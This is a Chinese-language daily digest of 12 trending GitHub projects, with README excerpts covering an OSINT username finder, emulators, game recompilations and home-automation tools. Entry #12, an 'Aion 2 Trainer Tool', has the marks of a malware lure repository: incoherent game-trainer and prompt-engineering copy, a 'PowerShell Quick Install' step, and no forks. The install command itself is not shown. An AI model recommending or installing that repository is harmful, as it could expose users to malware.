📊 开源日报 — 2026-11-08
共发现 12 个新项目（已自动过滤历史记录）

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#1  sherlock-project/sherlock
    ⭐ 101120 stars  |  🍴 11953 forks  |  💻 Python  |  📅 2018-12-24
    🔗 https://github.com/sherlock-project/sherlock
    📡 来源: trending-daily
    🏷️ cli, cti, cybersecurity, forensics, hacktoberfest, information-gathering, infosec, linux, osint, pentesting
    📝 Hunt down social media accounts by username across social networks

    README 摘要:
    Hunt down social media accounts by username across 400+ social networks
      
    
      Installation
      &nbsp;&nbsp;&nbsp;•&nbsp;&nbsp;&nbsp;
      Usage
      &nbsp;&nbsp;&nbsp;•&nbsp;&nbsp;&nbsp;
      Contributing
    
    ## Installation
    
      
    
    &#8202;&#8202;
    
    > [!WARNING]  
    > Packages for ParrotOS and Ubuntu 24.04, maintained by a third party, appear to be __broken__.  
    > Users of these systems should defer to `uv`/`pipx`/`pip` or Docker.
    
    | Method | Notes |
    | - | - |
    | `pipx install sherlock-project` | `pip` or `uv` may be used in place of `pipx` |
    | `docker run -it --rm sherlock/sherlock` |
    | `dnf install sherlock-project` | |
    
    Community-maintained packages are available for Debian (>= 13), Ubuntu (>= 22.10), Homebrew, Kali, and BlackArch. These packages are not directly supported or maintained by the Sherlock Project.
    
    See all alternative installation methods here.
    
    ## General usage
    
    To search for only one user:
    ```bash
    sherlock user123
    ```
    
    To search for more than one user:
    ```bash
    sherlock user1 user2 user3
    ```

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#2  meta/astryx
    ⭐ 14774 stars  |  🍴 1211 forks  |  💻 TypeScript  |  📅 2026-01-09
    🔗 https://github.com/meta/astryx
    📡 来源: trending-daily
    📝 An open source design system that's fully customizable and agent ready

    README 摘要:
    # Astryx
    
    An open source design system that's fully customizable and built for how we build now:  by people and the agents working alongside them.
    
    **Currently in Beta** · Built on React 19+ and StyleX
    
    **Docs** · **Storybook** · **Sandbox** · **Contributing** · **Discord**
    
    ## Overview
    
    Astryx is an open source design system that grew inside Meta over the last eight years, where it became the most-used and largest design system in the company — powering 13,000+ apps and shaped by the engineers, designers, and product teams who depend on it every day.
    
    It ships 150+ accessible components, brand-level theming, dark mode, ready-to-ship templates, and a CLI as one cohesive system. You import pre-built CSS and use typed React components — no build plugin, no styling library to adopt — and both people and AI assistants build with the same tooling.
    
    **What makes Astryx different:**
    
    - **Open internals.** Components are built to be composed at any level, not locked behind a closed top-level API. The building blocks you'd reach for are exported directly, and when you need to go deeper, swizzle ejects a component's full source into your project to own.
    - **No styling lock-in.** Astryx authors its styles with StyleX, but that's invisible to consumers. Override with `className` using Tailwind, CSS modules, or plain CSS — whatever your project already uses.
    - **Customize without wrapping.** A theme is a set of CSS custom property overrides, so a designer can make Astryx unmistakably theirs without forking or wrapping component source.
    - **Built for people and agents.** The API, docs, and CLI are designed together so a person and an AI assistant build the same way, from the same reference.
    
    ## Getting Started
    
    Astryx requires **React 19** or later (`react` and `react-dom` are peer dependencies of `@astryxdesign/core`).
    
    Install Astryx, a theme, and its peer dependencies:
    
    ```bash
    # npm
    npm install @astryxdesign/core @astryxdesign/theme-neutral @stylexjs/stylex
    npm install -D @astryxdesign/cli
    
    # pnpm
    pnpm add @astryxdesign/core @astryxdesign/theme-neutral @stylexjs/stylex
    pnpm add -D @astryxdesign/cli
    
    # yarn
    yarn add @astryxdesign/core @astryxdesign/theme-neutral @stylexjs/stylex
    yarn add -D @astryxdesign/cli
    ```

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#3  zortos293/Lichii
    ⭐ 5993 stars  |  🍴 904 forks  |  💻 C++  |  📅 2026-10-31
    🔗 https://github.com/zortos293/Lichii
    📡 来源: 🚀 两周800+星
    📝 VERY experimental Nintendo Switch 2 emulator

    README 摘要:
    # Lichii
    
    Lichii is an experimental, open-source Nintendo Switch and Switch 2 emulator written in C++. It builds on Eglantine, Eden, yuzu and Sudachi, preserving their contributions while developing this fork's game compatibility and renderer fixes.
    
    This is an independent fork, not an official release of those upstream projects. Lichii is not affiliated with Nintendo.
    
    Visit the official Lichii website to find games and compare community compatibility reports.
    
    ## Downloads and setup
    
    Published builds belong on this fork's releases page. The repository still uses its historical Eglantine name; the desktop application is now Lichii.
    
    On Windows, extract the entire build archive and run **lichii.exe**. Only use games and system files you have legally obtained. Games, keys and firmware are not included.
    
    ### Existing saves and settings
    
    The rebrand intentionally retains the existing Eden/Eglantine data directories and configuration keys. It does not move or delete saves, settings or shader caches. Back up your saves before testing experimental builds.
    
    ## Compatibility and issue reports
    
    Compatibility and performance vary by game, hardware and driver. Rendering errors, stutters and crashes remain possible. Passing automated tests does not establish that a game renders correctly, and this project makes no universal frame-rate guarantee.
    
    Browse community compatibility reports for results with each player's build and setup.
    
    Desktop reporting requires a build containing PR #303 and is not available in build 88. In builds that include it, play and stop a Switch 2 game, then right-click that game and choose **Submit compatibility report**. Only the latest session in the current Lichii process is eligible.
    
    Confirm the matching website catalog entry and review the editable machine, game, setup, and enabled add-on details prefilled where available. Check the public preview and give explicit consent before submitting. Nothing uploads automatically, and the native v1 reporter does not read or upload logs or files.
    
    When reporting an issue, include:
    
    - The exact build, game version, CPU, GPU and driver version.
    - Relevant settings and steps to reproduce the problem.
    - A screenshot and the log from the affected session, after checking it for personal information.
    
    Do not upload game files, keys, firmware or private account information.
    
    ## Building and contributing
    
    See the build guide, user documentation and coding guidelines. Some inherited documentation and i

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#4  NotRexed/Hookshot
    ⭐ 2089 stars  |  🍴 196 forks  |  💻 C++  |  📅 2026-11-05
    🔗 https://github.com/NotRexed/Hookshot
    📡 来源: 🚀 5天300+星
    📝 A Native Recompilation Of The Legend Of Zelda: Ocarina Of Time Nintendo Switch 2 Remake

    README 摘要:
    Hookshot
      
    
    The Legend of Zelda: Ocarina of Time (Nintendo Switch 2) running natively on Windows & Linux, with no emulator.
    
      Status |
      How to build |
      In-game menu |
      How it works |
      Want to help? |
      Credits |
      License
    
    Hookshot is a static recompilation. The game's code is translated to C and compiled into a Windows program, the
    console's system software is reimplemented, and the Switch 2 graphics are rebuilt on Vulkan. All of this happens
    **on your PC, from your own copy of the game**.
    
    Discord: https://discord.gg/DVQQJphbBf
    
    > [!IMPORTANT]
    > This repository **does not contain the game, keys or an executable**, and it does not explain how to get them. You
    > need your own copy. Everything the build creates (`hookshot.exe`, the generated code, the shader caches and your
    > saves) comes from your game and stays on your PC. Never share those files.
    
    ## Project status
    
    Experimental. It has only been tested on **one PC** (Ryzen 5 7600X, RTX 4060 Ti 16 GB), mostly in the area at the start
    of the game.
    
    | What | Status |
    |---|---|
    | Kokiri Forest: reaching gameplay and walking around | ✅ Works |
    | Sound, controller, keyboard and saves | ✅ Works |
    | In-game menu, frame generation and upscaling | ✅ Works |
    | Black flashes while moving | ✅ Fixed in testing, more play needed |
    | Performance without frame generation | ⚠️ About 50 fps walking, not yet a steady 60 |
    | Models with missing pieces (doors, fences, parts of trees) | ✅ Fixed where tested, more play needed |
    | Stutter when entering new areas | ⚠️ Still happens, mostly the first time |
    | Ultrawide | ⚠️ The 3D keeps its shape, but the HUD is stretched and the picture is softer |
    | Hyrule Field and the rest of the game | ❓ Not tested yet |

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#5  mbillow/localthings
    ⭐ 1101 stars  |  🍴 114 forks  |  💻 Python  |  📅 2026-06-30
    🔗 https://github.com/mbillow/localthings
    📡 来源: trending-daily
    🏷️ coap-protocol, coap-server, custom-component, dtls, hacs, hacs-integration, home-assistant, home-automation, samsung, smartthings
    📝 Control your Samsung appliances from Home Assistant over your home network, with no cloud account.

    README 摘要:
    # LocalThings
    
    **Control your Samsung appliances from Home Assistant over your home network, with no cloud account.**
    
    LocalThings connects Home Assistant to Samsung washers, dryers, refrigerators, air conditioners, ovens and other appliances that work with the SmartThings app. It talks to each appliance on your local network.
    
    - **Updates are fast.** Appliances that support push send changes as they happen. LocalThings checks the rest every 30 seconds.
    - **It works without the internet.** After setup, LocalThings never contacts Samsung's servers.
    - **Your data stays home.** LocalThings sends nothing to Samsung. The appliance itself still keeps its own connection to Samsung, and LocalThings doesn't change that.
    - **Setup needs an IP address.** For most appliances, you enter the address and LocalThings works out the type and model, then creates matching controls and sensors.
    
    ## What it supports
    
    | Appliance | Appliance |
    |---|---|
    | Air conditioner, including multi-unit systems | Microwave |
    | Air dresser | Oven |
    | Air monitor | Range and range hood |
    | Air purifier | Refrigerator, kimchi refrigerator, wine cellar |
    | Cooktop, gas, radiant electric and induction; some models read-only | Robot vacuum, early support |
    | Dehumidifier | Soundbar, media player, settings and status |
    | Dishwasher | Vacuum clean station |
    | Dryer | Washer and washer-dryer |
    | EHS heat pump | Water purifier |
    
    What you see depends on what each appliance reports. Typical controls and sensors include power, program or mode selection, start, pause and stop, temperatures and setpoints, time remaining and finish time, door and child-lock state, energy use, filter status and alarms.
    
    Most Samsung appliances from about 2022 onward work, and so do some earlier washers, air conditioners and wall ovens that use an older local interface. See Older appliances on TCP 8888. Setup detects which interface an appliance has, and tells you if it finds none.
    
    If an appliance sets up but LocalThings doesn't recognize it, or a control is missing, Home Assistant shows a notice asking for a diagnostics download. That download is usually all the maintainers need to add support. See Reporting a capability gap.
    
    ## Built on open standards
    
    LocalThings uses the standards the appliances implement:
    
    - **OCF, the Open Connectivity Foundation specification.** Samsung's connected appliances are OCF devices. LocalThings discovers each appliance's resources through `/oic/res` and reads its de

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#6  voyager-so/vork
    ⭐ 946 stars  |  🍴 63 forks  |  💻 Rust  |  📅 2026-11-05
    🔗 https://github.com/voyager-so/vork
    📡 来源: 🚀 5天300+星
    🏷️ 3d, ai-agents, gpu, metal, ray-tracing, rendering, rust, slang, vfx, vulkan
    📝 Headless 3D and VFX engine for agents. Research preview.

    README 摘要:
    vork, the Voyager rendering kernel, is a headless 3D and VFX engine built for agents.
    
    Watch the film: a car drives into the night as the forest
    turns into glowing cyan wireframe, drawn from real triangle edges by a scene shader.
    
    Credit: “Car Concept”
    by Unity Fan, glTF adaptation by Eric Chadwick / Darmstadt Graphics Group,
    CC BY 4.0. Changes: scaled, animated,
    brighter head and tail lights, wheel pose. Trees, ground and asphalt from Poly Haven
    (CC0). The far mountains and sky are an image-model painting on a curved 3D card;
    everything else that moves is rendered.
    
    ## Paste this to your agent
    
    Install vork, then paste:
    
    > Run `vork init my-shot`, read `vork help`, render a preview and inspect the image.
    > Refine the camera and lighting before rendering at final quality. Read the
    > relevant help topic when you need a feature the first page doesn't explain.
    
    A million birds, each steering itself over a lagoon. A black hole that bends
    light. A glowing seed placed on a real desk, lighting the room around it.
    These are scenes written as code and rendered on a GPU. No video model required.
    
    vork is written in Rust and Slang, with GPU rendering through Vulkan and Metal.
    An agent writes a scene,
    renders it, looks at the result and revises the code. There is no editor to drive.
    
    Most creative tools expose controls that a person can operate. An agent can also
    write a shader in the middle of a shot. vork gives it geometry, ray queries and
    GPU execution, then lets scene programs define materials, cameras, light
    propagation, simulation and compositing. Ordinary shots need only scene data;
    the programming hooks are there when the shot needs something unusual.
    
    Source-available and free during the research preview.
    
    ## Start here
    
    After installing vork, create a working project:
    

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#7  egoist/mygo-music
    ⭐ 852 stars  |  🍴 135 forks  |  💻 Go  |  📅 2026-11-04
    🔗 https://github.com/egoist/mygo-music
    📡 来源: 🚀 5天300+星
    📝 A native music player you extend with plugins

    README 摘要:
    # MyGo Music
    
    A native desktop music player written in Go with MyGo, no WebView. It plays your local files out of the box, and everything else comes from plugins.
    
    ## Features
    
    - Local files (MP3, FLAC, Ogg Vorbis, WAV, and ALAC, FLAC or AAC in .m4a and .aac) with tags, covers and `.lrc` lyrics
    - Playlists, liked songs, search, albums and artists
    - Now Playing with lyric stage styles, cover wall, queue, shuffle and repeat
    - Notch player on macOS, tray, media keys
    - Audio cache, fades on pause and seek, loudness normalization
    - Session restore
    - Podcast captions, written down on the device as episodes play
    - English and Simplified Chinese
    - Plugins can add accounts, catalogs, podcasts, stations, comments and pages of their own
    
    ## Build
    
    ```bash
    go tool mygo dev     # run in development
    go tool mygo build   # package into build/
    go test ./internal/...
    ```
    
    ## Podcast captions
    
    Episodes are written down on the device as they play, with sherpa-onnx and Qwen3-ASR, which the app downloads when the listener asks for them. The libraries come from this repository's `sherpa-onnx-` prerelease, which only changes with that version:
    
    ```bash
    go run ./scripts/sherpa -sign "Developer ID Application: …"
    gh release create sherpa-onnx-2.0.1 --prerelease --latest=false build/sherpa/*
    ```
    
    ## Plugins
    
    A plugin is a folder in the app's `plugins` directory (Settings > Plugins > + > Show Plugins Folder) with a `plugin.json` and one JavaScript or TypeScript file. Install one with the + in Settings > Plugins from GitHub, by its repository or its address, or from its folder or a zip of it on this computer, or drop the folder in by hand. Remove one from its ⋯ menu there. There's nothing to build, and the same plugin runs on every platform. `examples/demo-plugin` does everything a plugin can with made-up data: copy it to start.
    
    ```json
    {
      "id": "example",

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#8  sostenesfreitas/ocarina-recomp
    ⭐ 844 stars  |  🍴 47 forks  |  💻 C  |  📅 2026-11-06
    🔗 https://github.com/sostenesfreitas/ocarina-recomp
    📡 来源: 🚀 5天300+星
    📝 Ocarina of Time running natively on Windows, no emulator. Built on your PC from your own copy. No game files included.

    README 摘要:
    # Ocarina Recomp
    
    Read in English
    
    **Ocarina rodando nativo no Windows, sem emulador.**
    
    O código do jogo é traduzido para C e compilado como um programa do Windows. Os gráficos do Switch 2 são convertidos para Vulkan. Tudo isso acontece **no seu PC, a partir do seu próprio arquivo do jogo**.
    
    > [!IMPORTANT]
    > Este repositório **não contém o jogo, keys nem executável**, e não explica como obtê-los. Você precisa da sua própria cópia. O que a instalação gera (o `ocarina.exe`, o código gerado, o cache de shaders e os saves) sai do seu jogo: **não compartilhe**.
    
    ## Estado do projeto
    
    Experimental. Só foi testado em **um PC** (Ryzen 9 9950X3D, RTX 5090), na região do início do jogo.
    
    | O quê | Situação |
    |---|---|
    | Abertura e jogo novo, até a Árvore Deku | ✅ Funciona |
    | Vilarejo Kokiri: árvores, plantas, casas, luz | ✅ Funciona |
    | Som, controle, saves e vídeos | ✅ Funciona |
    | Desempenho na RTX 5090 | ✅ Cerca de 59 fps parado, 51 a 55 fps caminhando |
    | Travadinhas ao entrar em áreas novas | ⚠️ Ainda acontecem, principalmente na primeira vez |
    | Tocar a ocarina | ❓ Correção aplicada, ainda sem teste em jogo |
    | Hyrule Field e o resto do jogo | ❓ Ainda não testados |
    | Placas AMD e Intel | ❓ Nunca testadas |
    
    ## Como compilar
    
    O jogo não vem pronto: ele é compilado no seu PC, a partir da sua cópia. Escolha um destes três jeitos.
    
    **1. Com o instalador em ZIP, o mais fácil:** não instala nada no Windows e não pede administrador.
    
    1. Baixe o **`Ocarina-Setup-...-windows.zip`** da página de versões.
    2. **Extraia o ZIP inteiro** para uma pasta e abra o `Instalar-Ocarina.exe` que está dentro dela.
    3. O executável não tem assinatura digital, então o Windows pode avisar. Clique em **Mais informações** e depois em **Executar assim mesmo**.
    4. Na janela, escolha o `.nup` do seu jogo (ou uma pasta com `exefs` e `romfs`) e clique em **Instalar**.
    5. No fim, clique em **Jogar**, ou use o atalho **Ocarina Recomp** na Área de Trabalho.
    
    Para desinstalar, apague a pasta de instalação. Prefere conferir antes? O executável só abre o script `instalador\Instalar-Ocarina.ps1`, que está ao lado dele no ZIP e pode ser lido em qualquer editor. O código do executável tem poucas linhas. Alguns antivírus reclamam de programas novos sem assinatura e de scripts do PowerShell: é um alarme possível, e o código está todo aqui para quem quiser conferir. A página de versões traz o SHA-256 do arquivo.
    

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#9  WoYun520/gif-factory
    ⭐ 659 stars  |  🍴 80 forks  |  💻 Python  |  📅 2026-11-05
    🔗 https://github.com/WoYun520/gif-factory
    📡 来源: 🚀 5天300+星
    📝 GIF 工厂：按风格制作像素、人物与宠物、粘土吉祥物、光栅卡与动态海报的 GIF Skill。

    README 摘要:
    # GIF 工厂
    
    **挑一种风格，给一张参考图，把角色、相片和想法做成 GIF，也能延伸成动态绘本。**
    
    像素小人、人物与宠物、粘土吉祥物、光栅变画、漫画动态海报。
    先看效果，再换成你自己的角色和主题；拿不准就先做一张。
    
    **6 个 GIF 分类 · 9 个 GIF 风格入口 · 56 个动态案例，另有动态绘本和品牌短片**
    
    浏览风格 · 完整作品库 · 怎么使用 · Skill · 下载项目
    
    ## 精选：漫画印刷动态海报
    
    人物、背景和大字一起设计。黑白打底，每个角色保留一种主色；从平静切到登场，字体也跟着展开，6 秒循环。
    
    ▶ 播放九宫格 GIF · 使用这个风格 · 九张独立 GIF
    
    ## 挑一种风格
    
    每个分类都放了多个角色、动作或场景。点击动图看原尺寸，点击风格名看制作方法；各风格详情页共有 **56 个动态案例**。100 张完整系列继续放在作品库，默认收起。
    
    ### 像素与游戏
    
    鲸鱼娘·问候像素轻动效
    小秘书·回消息像素轻动效
    小秘书·生活像素轻动效
    
    眼镜男孩·冲鸭像素完整动作
    红帽女孩·你好呀像素完整动作
    太空猫·起飞啦像素完整动作
    
    像素轻动效 · 全部 6 张 · 像素完整动作 · 全部 8 张
    
    ### 插画与二次元
    
    鸣人·加油插画角色动作
    路飞·冲鸭插画角色动作
    初音·嗨呀插画角色动作
    
    公主裙·提裙行礼插画角色动作

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#10  dsx-ai-factory/nvke
    ⭐ 619 stars  |  🍴 95 forks  |  💻 Go  |  📅 2026-08-04
    🔗 https://github.com/dsx-ai-factory/nvke
    📡 来源: trending-daily
    🏷️ bare-metal, cluster-api, gpu, kubernetes, nvidia
    📝 NVIDIA Kubernetes Engine (NVKE). A management plane for GPU Kubernetes on bare metal.

    README 摘要:
    # NVIDIA Kubernetes Engine (NVKE)
    
    **Run a managed Kubernetes service on your own NVIDIA GPU infrastructure.**
    NVIDIA Kubernetes® Engine (NVKE) provides the management plane that platform teams install to create and
    operate Kubernetes clusters for their customers. Each workload cluster has its
    own Kubernetes control plane, etcd and node pools. You operate the NVKE management
    plane; your customers use their clusters through the Kubernetes API and `kubectl`.
    
    > **Preview:** NVKE is available as a preview. APIs, configuration and behavior
    > can change between releases, and we do not recommend NVKE for production
    > workloads. See Preview status and known limitations.
    
    Get started · Documentation ·
    Contribute · Get help
    
    ## Getting started
    
    | Your goal | Start here | What you get |
    |---|---|---|
    | **Evaluate without GPU hardware** | Local quickstart | A development management plane and a workload cluster on simulated machines. No NVIDIA account is required. |
    | **Install on your infrastructure** | Plan your installation | The prerequisites and sequence for preparing nodes, bootstrapping a management cluster and installing its services. |
    | **Build or contribute** | Build from source | The NVKE binaries and the contributor development loop. |
    
    The local quickstart runs on a **Linux host or VM, amd64 or arm64**, with at least
    **6 CPUs, 12 GiB of free memory and 100 GiB of free disk**. It requires Docker,
    virtual TPM support and the tools listed in the guide. Follow its setup through
    workload-cluster creation and confirm the cluster's nodes report `Ready`.
    On macOS, use the local site guide, which runs
    the evaluation inside a Colima virtual machine.
    
    For a real installation, you supply the machines, networking, node images and
    registries, and configure access to **NVIDIA Infra Controller (NICo)**. NICo is
    the sole compatible infrastructure provider at preview. The
    platform and version reference lists
    validated combinations and pinned dependencies.
    
    ## What NVKE does
    
    - **Creates independent workload clusters.** Request clusters through the NVKE
      API or `nvkectl`; NVKE provisions machines through NICo and forms Kubernetes

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#11  ⚠️风险  Th0rgal/satmux
    ⚠️ 命中风险词: bypass —— 默认归排除区，需人工确认
    ⭐ 608 stars  |  🍴 28 forks  |  💻 Python  |  📅 2026-11-07
    🔗 https://github.com/Th0rgal/satmux
    📡 来源: 🚀 5天300+星
    📝 Accelerate high-latency GEO inflight Wi-Fi via warm BBR TCP multiplexing + 1-RTT Ground-TLS + zlib (zero dependencies)

    README 摘要:
    # satmux
    
    TCP multiplexer and `1-RTT` HTTP/TLS relay for geostationary (GEO) inflight Wi-Fi (Inmarsat GX, Viasat, Panasonic, SITA). Pure Python 3 stdlib, zero external dependencies.
    
    Measured inflight over Inmarsat GX Ka-band (`~620 ms` RTT, SITA `AS206433` Amsterdam ground station):
    
    ```text
      ORIGIN (6× PARALLEL)  RAW CABIN WI-FI (:443)    1-RTT BBR + ZLIB MUX    SPEEDUP
      ────────────────────  ────────────────────────  ──────────────────────  ─────────
      GitHub Repo           ████████████    TIMEOUT  ███░░░░░░░░░    4.66s  FIXED ✓
      GitHub API            ████████████  TCP RESET  ██░░░░░░░░░░    2.66s  FIXED ✓
      Hacker News           ████████████    TIMEOUT  ██░░░░░░░░░░    2.28s  FIXED ✓
      MDN Docs              ████████░░░░     12.01s  ██░░░░░░░░░░    2.30s     5.2×
      Cloudflare            ██░░░░░░░░░░      2.97s  █░░░░░░░░░░░    1.40s     2.1×
      PyPI JSON API         █████░░░░░░░      7.09s  ██░░░░░░░░░░    2.64s     2.7×
      ──────────────────────────────────────────────────────────────────────────────────
      6-Origin Burst:    19.13s (3/6 failed)  →  5.35s (0/6 failed)   [3.6× faster · -76% TTFB]
    ```
    
    ## Problem
    
    Non-Starlink inflight Wi-Fi usually breaks on three things unrelated to raw bandwidth:
    
    1. **Onboard `:443` middleboxes and DNS interception.** Cabin gateways intercept `:53` DNS and run a transparent `:443` split-TCP proxy (PEP) whose state table drops connections under load (`Connection reset by peer` / TLS timeouts on `github.com`, `api.github.com`, package registries). Non-443 TCP ports pass through untouched.
    2. **Handshake round-trips (`~620 ms` per GEO hop).** Every new origin normally pays multiple satellite round-trips (DNS + TCP + TLS) before transferring payload bytes.
    3. **Cubic congestion collapse.** Cabin Wi-Fi packet loss causes standard TCP to halve `cwnd` repeatedly, leaving most of your per-seat token-bucket cap unused.
    
    ## How it works
    
    ```text
    Direct (:443):
      laptop ──▶ cabin DNS + :443 PEP ══(3–4 GEO RTTs)══▶ ground ──▶ origin  (frequent TCP resets)
    
    satmux (:8444):
      laptop ══(12 persistent TCP :8444 BBR + zlib pipes)══▶ ground VM ──(2 ms)──▶ origin
    ```
    
    - **Persistent non-443 carrier pool (`:8444`):** Keeps 12 pre-warmed TCP connections open to a Linux VM near the satellite ground station, bypassing the cabin `:443` proxy and onboard DNS. Streams are scheduled onto the carrier with the lowest recent byte load so idle browser keepalives do not cause head-of-line queueing.
    - **0-RTT stream open (`127.0.0.1:1080` SOCKS5 / `

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#12  Arda313131882/aion-2-trainer-tool
    ⭐ 244 stars  |  🍴 0 forks  |  💻 HTML  |  📅 2026-11-06
    🔗 https://github.com/Arda313131882/aion-2-trainer-tool
    📡 来源: 🤖 AI / LLM / RAG | 新建 | prompt engineering tool
    🏷️ aion-2, aion-2-2026, aion-2-game, aion-2-optimizer, aion-2-trainer, aion-2-trainer-tool, aion2-combat-analysis, aion2-meter, automation, desktop
    📝 Aion 2 AI Prompt Engineering Toolkit - Standalone Desktop Trainer Setup

    README 摘要:
    # Aion 2 Trainer Tool — Game Enhancer for Windows
    
    ### 🚀 PowerShell Quick Install
    
      
    
    ---
    
    This standalone build equips Aion 2 players with a complete, pre-configured desktop environment built around advanced AI prompt engineering tools. Everything ships ready to run—no dependency hunting, no patch roulette, just a single setup that gets you from download to playable state fast. Every component has been verified against a clean Windows x64 target, so what lands on your machine is exactly what was tested. Drop it in, launch it, and the tooling works the moment you need it.
    
    ## ✅ Before You Start
    
    - Windows 10 or Windows 11
    - PowerShell 5.1 or newer (already available on Windows)
    - Active network connection
    - No admin rights needed
    
    ## Features
    
    - **Local-First Architecture** — everything runs on your desktop. No cloud dependency, no mandatory sign-in, no round-trip latency between you and your prompts.
    - **Advanced Prompt Engineering Toolkit** — build, chain, and refine complex AI prompts without wrestling with syntax. Structured templates, variable injection, and reusable blocks keep iteration fast.
    - **Complete Standalone Setup** — the full package ships self-contained. Unpack, launch, and you're in the tool — no external runtime scavenger hunt required.
    - **Windows x64 Native** — tuned for desktop performance on the platform you actually play and work on.
    - **Prompt Library & Reusability** — save your best-performing prompts as presets, swap variables on the fly, and keep your workflow repeatable instead of re-typing from scratch every session.
    - **Rapid Iteration Loop** — edit, test, and compare prompt outputs in a tight cycle so you can dial in results without breaking flow.
    - **Portable Configuration** — settings live in plain, human-readable config so you can back them up, version them, and move them between machines.
    - **Zero-Friction Onboarding** — sensible defaults out of the box, with enough exposed knobs for power users who want to tune behavior.
    - **Built for Offline Reliability** — once set up, the core tooling doesn't stall when your connection does.
    
    ## How It Works
    
    The tool runs entirely on your local machine — no launcher overhead, no background services, no waiting on a remote handshake. Drop it on your desktop, fire it up, and the core engine initializes in seconds.
    
    Under the hood, the prompt engineering layer handles the heavy lifting. Presets are pre-tuned and ready to go, so you're not building prompts from scratch every session.
